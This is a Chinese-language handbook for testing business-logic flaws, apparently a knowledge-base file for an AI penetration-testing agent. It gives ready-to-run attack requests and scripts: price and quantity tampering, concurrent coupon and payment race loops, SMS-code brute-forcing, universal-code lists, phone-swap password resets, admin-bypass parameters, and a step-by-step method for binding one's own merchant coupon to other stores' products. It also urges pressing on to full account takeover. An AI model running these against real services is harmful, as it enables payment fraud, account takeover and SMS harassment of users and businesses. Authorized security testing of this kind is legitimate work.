> 写不写只认 `~/.grok/rules/vuln-report-format.md`。进站有会话时最低探针见 `dig-scope` §4.2.3（加字段、跳步、领取/库存/券并发一枪）。本篇是测法：支付/流程/验证码都测；发码/滑块没进号就转认证链，别停半截。
> 短表「商家促销绑定」在 §1.4。英文 business-logic / CHECKLIST / METHODOLOGY / SCENARIOS 附件已砍；支付/流程/验证码测法仍在上半。

---

## 一、原有knowledge-base

# 逻辑漏洞测试手册

## 一、支付逻辑漏洞

### 1.1 价格篡改

```bash
# 在购物车提交时，修改商品单价
# 抓取订单提交请求，修改 price 字段
POST /api/order/create
{"goodsId": "123", "count": 1, "price": "0.01"}  # 原价改为 0.01

# 负数价格（余额增加）
{"goodsId": "123", "count": 1, "price": "-100"}
```

### 1.2 数量篡改

```bash
# 购买 1 件但请求中修改为 -1（可能退款）
{"goodsId": "123", "count": -1, "price": "99.00"}

# 整数溢出（32位最大值）
{"count": 2147483647}
```

### 1.3 优惠券/积分漏洞

```bash
# 重复使用同一优惠券
# 并发竞争（多线程同时提交同一优惠券）
for i in $(seq 1 20); do
  curl -X POST "https://target.com/api/coupon/use" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"couponId": "COUPON123"}' &
done
wait

# 负数积分（积分兑换时设负数）
{"points": -1000}  # 期望余额增加
```

### 1.4 商家促销绑定：券挂到别人的货（短表有指针）

> 本质：商家后台「把我的促销/券绑到某件货」只信请求里的 `productId`，不查这件货是不是本店的。  
> 和结账改价、改券面值、结账换便宜 SKU **不是一条**。短表一行指向本节。

**认：** 有商家/供应商后台；能建满减、无门槛券、促销；绑货接口名常带 `relate` / `bind` / `attach` / `apply` + `promo` / `salespromotion` / `coupon`；body 里同时有券/活动 ID 和 `productId` / `skuId` / `goodsId`。

**打：**

1. 用本店号建一张规则狠的券（无门槛、面值够大、不限本店品类更好）  
2. 正常绑一次自己的货，抓住绑定请求  
3. **只改** `productId`（或同义字段）成别人店、别的品类的货；券 ID / 活动 ID 不动  
4. 不登录打开 C 端那件货的详情/下单页，看标价和应付  

**算成：** C 端别人那件货的应付价按你这张券掉下来（能下单更好）。只证明绑定接口 200、商家后台列表多了一行 → 不算，必须 C 端价真变。

**假点：** 绑定成功但 C 端价/结算不变；后端按商家会话重写商品、只绑得动自己的货；改的是 C 端结账包里的 `productId` 换成更便宜的 SKU（那是清单里已有的「结账换货」，不是本条）。

和邻近手法别混：

| 本条 | 别当成 |
|------|--------|
| B 端绑券接口，改的是「绑到哪件货」 | C 端结账改 `amount` / `coupon_amount` |
| 自己的券 + 别人的 `productId` | 结账把 `productId` 换成更便宜的 SKU 再付钱 |
| 要看到 C 端价掉下来 | 商家后台列表显示绑成功就算 |

开场半分钟：有商家后台就建券 → 抓绑定包 → 换一个明显不是本店的 `productId` → 打开 C 端看价。

---

## 二、验证码/短信漏洞

> 测到接管/越权闭环（码回显+登录、万能码+登录、爆破+改密）才算打穿。只触发发送/滑块过了/能试密没进号 → 转认证链，别停半截。

### 2.1 验证码可枚举

```python
import requests

# 4位数字验证码 - 逐一尝试
for code in range(0, 10000):
    r = requests.post("https://target.com/api/verify",
        json={"phone": "13800138000", "code": f"{code:04d}"})
    if r.json().get("code") == 0:
        print(f"正确验证码: {code:04d}")
        break

# 验证: 是否有频率限制（前20次无限制 → 没进号继续跟认证链）
```

### 2.2 万能验证码

```
测试以下验证码:
000000, 123456, 888888, 666666
111111, 999999
空值: ""
不发验证码直接提交
```

### 2.3 短信轰炸（内部略测限频，别停半截）

> 只证明能发码不算打穿。下面技术点防把轰炸接口当主洞。

```python
# 测试是否有发送频率限制（仅测试1-2次，不实际轰炸）
# 验证:
# 1. 同号码连续发送间隔是否有限制
# 2. IP 限制是否存在
# 3. 修改 phone 参数但仍发送到固定号码
{"phone": "目标手机号", "realPhone": "13800138000"}
```

---

## 三、竞争条件（Race Condition）

### 3.1 并发扣减

```python
import threading
import requests

# 余额 100，同时发起 10 次 100 元消费
def consume():
    r = requests.post("https://target.com/api/pay",
        headers={"Authorization": f"Bearer {TOKEN}"},
        json={"amount": 100})
    print(r.json())

threads = [threading.Thread(target=consume) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
```

### 3.2 重复提交

```bash
# 订单重复提交（同一请求发多次）
for i in $(seq 1 10); do
  curl -X POST "https://target.com/api/order/pay" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"orderId": "ORDER123", "amount": "0.01"}' &
done
```

---

## 四、账号安全漏洞

### 4.1 账号枚举

```bash
# 注册/登录接口区分"用户不存在"和"密码错误"
# 如果响应不同 → 可枚举账号

# 注册时检测手机号是否已注册
curl "https://target.com/api/register/check?phone=13800138000"
# 响应 {"exists": true} → 可枚举
```

### 4.2 密码找回逻辑

```
测试流程:
1. 发起找回密码（手机 A）
2. 获取到 token/链接
3. 修改请求中的 phone 为手机 B
4. 如果成功修改 B 的密码 → 任意账号密码重置
```

### 4.3 接管漏洞

```
场景: 手机注销后重新分配给他人
1. 用已注销号码注册
2. 尝试登录原绑定账号
3. 或: 修改绑定手机号时验证码发送到旧号
```

---

## 五、业务逻辑绕过

### 5.1 状态机绕过

```bash
# 正常流程: 步骤1 → 步骤2 → 步骤3 → 完成
# 尝试跳过步骤2直接执行步骤3
# 或者回退到步骤1但保留步骤3的结果

# 记录每步的请求，逐一重放，观察能否越过校验
```

### 5.2 测试用参数

```
在请求中添加：
debug=true / test=1 / internal=1
is_admin=true / role=admin
from_internal=1 / bypass_check=1
```

---
